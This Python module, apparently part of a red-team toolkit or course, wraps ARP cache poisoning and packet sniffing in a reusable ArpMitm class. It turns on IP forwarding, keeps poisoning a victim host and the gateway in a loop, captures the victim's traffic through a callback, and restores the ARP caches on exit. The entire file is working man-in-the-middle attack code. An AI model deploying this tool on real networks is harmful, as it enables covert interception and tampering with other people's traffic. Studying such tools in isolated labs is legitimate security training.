"""
Red Team Toolkit — MitM Module

Wraps ARP poisoning and traffic interception from Module 3.
Provides an ArpMitm context manager for clean setup/teardown.
"""

import sys
import os
sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))

import threading
import time

from module3.arp_mitm import (
    get_mac, poison, restore,
)
from scapy.all import AsyncSniffer, conf


class ArpMitm:
    """
    Context manager for ARP MitM attack.

    Usage:
        with ArpMitm("192.168.56.2", "192.168.56.254", callback=my_fn) as mitm:
            time.sleep(30)   # mitm is active here
        # ARP caches automatically restored on exit

    Or manually:
        mitm = ArpMitm("192.168.56.2", "192.168.56.254")
        mitm.start()
        # ... do stuff ...
        mitm.stop()
    """

    def __init__(
        self,
        victim_ip:  str,
        gateway_ip: str,
        iface:      str = None,
        callback          = None,
        interval:   float = 2.0,
    ):
        self.victim_ip   = victim_ip
        self.gateway_ip  = gateway_ip
        self.iface       = iface or conf.iface
        self.callback    = callback
        self.interval    = interval

        self.victim_mac  = None
        self.gateway_mac = None
        self._stop       = threading.Event()
        self._threads    = []
        self._sniffer    = None

    def _enable_forwarding(self):
        try:
            with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
                f.write("1")
        except Exception:
            pass

    def _poison_loop(self):
        while not self._stop.is_set():
            poison(self.victim_ip, self.victim_mac, self.gateway_ip, self.iface)
            poison(self.gateway_ip, self.gateway_mac, self.victim_ip, self.iface)
            self._stop.wait(self.interval)

    def start(self):
        """Resolve MACs, enable forwarding, start poisoning and sniffing."""
        self._enable_forwarding()
        self.victim_mac  = get_mac(self.victim_ip,  self.iface)
        self.gateway_mac = get_mac(self.gateway_ip, self.iface)

        t = threading.Thread(target=self._poison_loop, daemon=True)
        t.start()
        self._threads.append(t)

        if self.callback:
            bpf = f"ip host {self.victim_ip}"
            self._sniffer = AsyncSniffer(
                iface=self.iface,
                filter=bpf,
                prn=self.callback,
                store=False,
            )
            self._sniffer.start()

        time.sleep(1)   # let first poison propagate
        return self

    def stop(self):
        """Stop poisoning, restore ARP caches, stop sniffer."""
        self._stop.set()
        for t in self._threads:
            t.join(timeout=5)
        if self._sniffer:
            self._sniffer.stop()

        if self.victim_mac and self.gateway_mac:
            restore(self.victim_ip,  self.victim_mac,  self.gateway_ip, self.gateway_mac, self.iface)
            restore(self.gateway_ip, self.gateway_mac, self.victim_ip,  self.victim_mac,  self.iface)

    def __enter__(self):
        return self.start()

    def __exit__(self, *_):
        self.stop()

    @property
    def is_active(self) -> bool:
        return not self._stop.is_set()
